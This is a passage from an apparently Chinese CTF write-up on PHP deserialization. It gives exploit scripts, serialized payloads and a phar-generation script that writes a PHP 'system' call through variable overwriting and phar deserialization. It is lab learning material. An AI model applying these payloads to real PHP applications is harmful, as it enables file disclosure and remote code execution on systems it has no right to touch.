class="hljs-comment">// function is_valid($s) &#123;</span><br><span class="hljs-comment">//     for($i = 0; $i &lt; strlen($s); $i++)</span><br><span class="hljs-comment">//         if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span><br><span class="hljs-comment">//             return false;</span><br><span class="hljs-comment">//     return true;</span><br><span class="hljs-comment">// &#125;</span><br><br><span class="hljs-comment">// if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;</span><br><br><span class="hljs-comment">//     $str = (string)$_GET[&#x27;str&#x27;];</span><br><span class="hljs-comment">//     if(is_valid($str)) &#123;</span><br><span class="hljs-comment">//         $obj = unserialize($str);</span><br><span class="hljs-comment">//     &#125;</span><br><br><span class="hljs-comment">// &#125;</span><br></code></pre></td></tr></table></figure>

<p>发现确实找到了小s 然后再写一个字符替换</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-comment">// function __construct() &#123;</span><br>    <span class="hljs-comment">//     $op = &quot;1&quot;;</span><br>    <span class="hljs-comment">//     $filename = &quot;/tmp/tmpfile&quot;;</span><br>    <span class="hljs-comment">//     $content = &quot;Hello World!&quot;;</span><br>    <span class="hljs-comment">//     $this-&gt;process();</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// public function process() &#123;</span><br>    <span class="hljs-comment">//     if($this-&gt;op == &quot;1&quot;) &#123;</span><br>    <span class="hljs-comment">//         $this-&gt;write();</span><br>    <span class="hljs-comment">//     &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br>    <span class="hljs-comment">//         $res = $this-&gt;read();</span><br>    <span class="hljs-comment">//         $this-&gt;output($res);</span><br>    <span class="hljs-comment">//     &#125; else &#123;</span><br>    <span class="hljs-comment">//         $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// private function write() &#123;</span><br>    <span class="hljs-comment">//     if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br>    <span class="hljs-comment">//         if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br>    <span class="hljs-comment">//             $this-&gt;output(&quot;Too long!&quot;);</span><br>    <span class="hljs-comment">//             die();</span><br>    <span class="hljs-comment">//         &#125;</span><br>    <span class="hljs-comment">//         $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br>    <span class="hljs-comment">//         if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br>    <span class="hljs-comment">//         else $this-&gt;output(&quot;Failed!&quot;);</span><br>    <span class="hljs-comment">//     &#125; else &#123;</span><br>    <span class="hljs-comment">//         $this-&gt;output(&quot;Failed!&quot;);</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// private function read() &#123;</span><br>    <span class="hljs-comment">//     $res = &quot;&quot;;</span><br>    <span class="hljs-comment">//     if(isset($this-&gt;filename)) &#123;</span><br>    <span class="hljs-comment">//         $res = file_get_contents($this-&gt;filename);</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">//     return $res;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// private function output($s) &#123;</span><br>    <span class="hljs-comment">//     echo &quot;[Result]: &lt;br&gt;&quot;;</span><br>    <span class="hljs-comment">//     echo $s;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// function __destruct() &#123;</span><br>    <span class="hljs-comment">//     if($this-&gt;op === &quot;2&quot;)</span><br>    <span class="hljs-comment">//         $this-&gt;op = &quot;1&quot;;</span><br>    <span class="hljs-comment">//     $this-&gt;content = &quot;&quot;;</span><br>    <span class="hljs-comment">//     $this-&gt;process();</span><br>    <span class="hljs-comment">// &#125;</span><br><br>&#125;<br><br><span class="hljs-comment">// echo urlencode(serialize(new FileHandler));</span><br><span class="hljs-comment">// O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00op%22%3Bi%3A2%3Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A10%3A%22%00%2A%00content%22%3BN%3B%7D</span><br><span class="hljs-comment">// 因为上传的时候存在检测ascii码存在一定的范围</span><br><br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$ser</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decorate</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>&#123;<br>    <span class="hljs-variable">$arr</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-variable">$s</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$arr</span>); <span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>],<span class="hljs-string">&quot;\0&quot;</span>) != <span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">2</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">2</span>] = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">2</span>]);<br>            <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-string">&#x27;\00&#x27;</span>,<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>]); <span class="hljs-comment">//注意区分单引号双引号</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;替换后:&quot;</span>.<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;替换后:&quot;</span>.<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">2</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//拼接回来</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">join</span>(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-variable">$arr</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">decorate</span>(<span class="hljs-variable">$ser</span>);<br><br><br><br><span class="hljs-comment">// function is_valid($s) &#123;</span><br><span class="hljs-comment">//     for($i = 0; $i &lt; strlen($s); $i++)</span><br><span class="hljs-comment">//         if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span><br><span class="hljs-comment">//             return false;</span><br><span class="hljs-comment">//     return true;</span><br><span class="hljs-comment">// &#125;</span><br><br><span class="hljs-comment">// if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;</span><br><br><span class="hljs-comment">//     $str = (string)$_GET[&#x27;str&#x27;];</span><br><span class="hljs-comment">//     if(is_valid($str)) &#123;</span><br><span class="hljs-comment">//         $obj = unserialize($str);</span><br><span class="hljs-comment">//     &#125;</span><br><br><span class="hljs-comment">// &#125;</span><br></code></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot; * op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot; * filename&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot; * content&quot;</span>;N;&#125;<br><span class="hljs-string">&quot; * op&quot;</span>;i<br>&#123;s<br>替换后:<span class="hljs-string">&quot;\00*\00op&quot;</span>;i<br>替换后:&#123;S<br><span class="hljs-string">&quot; * filename&quot;</span>;s<br><span class="hljs-number">2</span>;s<br>替换后:<span class="hljs-string">&quot;\00*\00filename&quot;</span>;s<br>替换后:<span class="hljs-number">2</span>;S<br><span class="hljs-string">&quot; * content&quot;</span>;N;&#125;<br><span class="hljs-string">&quot;flag.php&quot;</span>;s<br>替换后:<span class="hljs-string">&quot;\00*\00content&quot;</span>;N;&#125;<br>替换后:<span class="hljs-string">&quot;flag.php&quot;</span>;S<br>O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;S:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;\00*\00op&quot;</span>;i:<span class="hljs-number">2</span>;S:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;\00*\00filename&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;S:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;\00*\00content&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure>

<p>之所以会产生这些不可见0字符 是因为protected和private属性的原因导致 所以需要我们进行替换</p>
<p>传入后查看页面源代码成功获取flag：</p>
<p><img src="/.com//17476574315877288923840810046356-20250519202352-rzwpee6.png" srcset="/image/loading.gif" lazyload alt="17476574315877288923840810046356"></p>
<p>同时这道题目也可以装瞎 把protected的属性改成public进行攻击</p>
<p>但是当时这道题目在读取文件<strong>析构函数切目录</strong>的时候不在当前目录 需要获取其绝对路径进行读取</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;/proc/self/cmdline&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br><br>&#125;<br><br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$ser</span>;<br></code></pre></td></tr></table></figure>

<p>第二种方法 提前结束 快速析构</p>
<p>把属性值修改</p>
<p>​<code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code>​</p>
<p>改为</p>
<p>​<code>O:11:&quot;FileHandler&quot;:4:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code>​</p>
<p>或者删除结尾的大括号</p>
<p>​<code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;</code>​</p>
<p>‍</p>
<h2 id="phar例题："><a href="#phar例题：" class="headerlink" title="phar例题："></a>phar例题：</h2><p><strong>X-NUCA 2020 Final</strong></p>
<ol>
<li>变量覆盖读template.php</li>
<li>变量覆盖写入无损phar文件</li>
<li>变量覆盖触发phar反序列化</li>
</ol>
<p>题目：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL);<br><span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&#x27;/var/www/html/uploads/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$sandbox</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<br>&#125;<br><br><span class="hljs-keyword">include_once</span>(<span class="hljs-string">&#x27;template.php&#x27;</span>);<br><br><span class="hljs-comment">//                key     value</span><br><span class="hljs-variable">$template</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;tp1&#x27;</span>=&gt;<span class="hljs-string">&#x27;tp1.tpl&#x27;</span>,<span class="hljs-string">&#x27;tp2&#x27;</span>=&gt;<span class="hljs-string">&#x27;tp2.tpl&#x27;</span>,<span class="hljs-string">&#x27;tp3&#x27;</span>=&gt;<span class="hljs-string">&#x27;tp3.tpl&#x27;</span>);<br><br><br><span class="hljs-comment">//看似多余的东西往往是解题的关键</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>], EXTR_OVERWRITE);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tp&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$tp</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tp&#x27;</span>];<br>       <span class="hljs-comment">//  判断tp是否为template中的key</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-variable">$tp</span>, <span class="hljs-variable">$template</span>) === <span class="hljs-literal">FALSE</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No! You only have 3 template to reader&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-comment">//读取文件</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$template</span>[<span class="hljs-variable">$tp</span>]);<br>    <span class="hljs-variable">$temp</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Template</span>(<span class="hljs-variable">$content</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Please choice one template to reader&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p><strong>小技巧：</strong>  在源代码中看似没有一点用处的东西可能会成为解题的关键 比如在这里面存在着extract方法，可以用于变量覆盖</p>
<p>分析题目我们发现 想要读取文件 只能是在template数组中进行读取 但是其内容已经写好固定了，所以需要我们对template数组进行变量覆盖</p>
<p>对var数组进行操作 去读取template.php文件的内容</p>
<p>key value</p>
<p>array(‘template’ =&gt; array(‘tp1’ =&gt; ‘template.php’))</p>
<p>把template数组中的tp1这个key 的 value换成 template.php</p>
<p>即传参<code>?var[template][tp1]=template.php</code>​</p>
<p><img src="/.com//17476580781468024852844359025089-20250519203439-s946w93.png" srcset="/image/loading.gif" lazyload alt="17476580781468024852844359025089"></p>
<p>对upload后面的开始访问：<a target="_blank" rel="noopener" href="http://122.114.252.87:1120/uploads/7cddc639132e5953bf969cc3c9b08fd7/67c8a41ae1c9406576160aaf0370816e.html">http://122.114.252.87:1120/uploads/7cddc639132e5953bf969cc3c9b08fd7/67c8a41ae1c9406576160aaf0370816e.html</a></p>
<p>得到一段php代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Template</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$pattern</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$suffix</span>;<br><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$content</span></span>)</span>&#123;<br>		<span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-variable">$content</span>;<br>		<span class="hljs-variable language_">$this</span>-&gt;pattern = <span class="hljs-string">&quot;/&#123;&#123;([a-z]+)&#125;&#125;/&quot;</span>;<br>		<span class="hljs-variable language_">$this</span>-&gt;suffix = <span class="hljs-string">&quot;.html&quot;</span>;<br>	&#125;<br><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>		<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">render</span>();<br>	&#125;<br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">//必须利用里面的break跳出死循环 才能到危险函数</span><br>		<span class="hljs-keyword">while</span> (True) &#123;<br>			<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$this</span>-&gt;pattern, <span class="hljs-variable">$this</span>-&gt;content, <span class="hljs-variable">$matches</span>)!==<span class="hljs-number">1</span>) <br>				<span class="hljs-keyword">break</span>;<br>			<span class="hljs-keyword">global</span> $&#123;<span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>]&#125;;<br>			<br>			<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($&#123;<span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>]&#125;)) &#123;<br>				<span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$this</span>-&gt;pattern, $&#123;<span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>]&#125;, <span class="hljs-variable">$this</span>-&gt;content);<br>			&#125; <br>			<span class="hljs-keyword">else</span>&#123;<br>				<span class="hljs-keyword">break</span>;<br>			&#125;<br>		&#125;<br>        <span class="hljs-comment">//suffic的长度必须大于5</span><br>		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;suffix)&gt;<span class="hljs-number">5</span>) &#123;<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error suffix&quot;</span>;<br>			<span class="hljs-keyword">die</span>();<br>		&#125;<br>		<span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;/var/www/html/uploads/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&quot;/&quot;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;content) . <span class="hljs-variable language_">$this</span>-&gt;suffix;<br>        <span class="hljs-comment">//危险函数 需要走过来嗷</span><br>		<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$this</span>-&gt;content);<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your html file is in &quot;</span> . <span class="hljs-variable">$filename</span>;<br>	&#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>因为在这个类中存在获取文件的方法 但是没有反序列化的途径 所以很明显嗷 这是个<strong>phar</strong>的问题</p>
<p>根据phar的条件进行解题探索</p>
<p>file_put_contents： phar可利用的函数</p>
<p>先构造pop链生成phar文件</p>
<p>本地测试时注意修改我们的php.ini的配置文件</p>
<p> <img src="/.com//17476581091664899805473643872117-20250519203510-1ovs32j.png" srcset="/image/loading.gif" lazyload alt="17476581091664899805473643872117"></p>
<p>避大坑！！！！ 可能我们修改了之后 但是在vscode中无法操作成功 原因在于版本不匹配</p>
<p>姿势1：修改ini之后 直接在本地访问该网页 然后就会在同级目录生成对应文件</p>
<p>姿势2：在cmd中输入<code>php -v</code>​查看一下电脑环境的默认php版本</p>
<p><img src="/.com//17476581185514129733610710164602-20250519203519-4vcfew4.png" srcset="/image/loading.gif" lazyload alt="17476581185514129733610710164602"></p>
<p>然后在phpStudy中修改对于版本的ini文件进行访问</p>
<p>想要file_get_contents读取到我们的phar.phar的内容有两种方法：</p>
<ol>
<li>file_get_contents可以发起http请求 只需要我们把phar文件写到服务器上就可以</li>
<li>file_get_contents读取data:&#x2F;&#x2F;协议</li>
</ol>
<p><strong>data:&#x2F;&#x2F;的使用方式：</strong></p>
<p>首先构造好反序列化的payload 然后在尾部添加上phar的八股文</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Template</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;&lt;?php system(&#x27;ls&#x27;);?&gt;&quot;</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$pattern</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$suffix</span> = <span class="hljs-string">&quot;.php&quot;</span>;<br><br>&#125;<br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Template</span>();<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub，增加gif文件头</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span 